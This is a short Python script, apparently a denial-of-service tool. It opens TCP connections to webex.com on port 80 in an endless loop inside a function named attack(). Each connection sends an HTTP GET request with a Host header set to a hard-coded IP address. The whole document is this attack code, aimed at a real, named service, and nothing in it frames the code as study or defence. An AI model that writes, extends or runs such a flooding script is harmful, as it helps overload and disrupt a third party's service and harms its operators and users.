from threading import Thread
from socket import *

tip = gethostbyname('webex.com')
port = 80
fip = '123.45.21.79'

def attack():
    while True:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((tip, port))
        s.sendto(('GET /' + tip + " HTTP/1.1\r\n").encode('ascii'), (tip, port))
        s.sendto(('Host: '+ fip + '\r\n\r\n').encode('ascii'), (tip, port))
        s.close()

for n in range(1):
    t = Thread(target=attack)
    t.start()
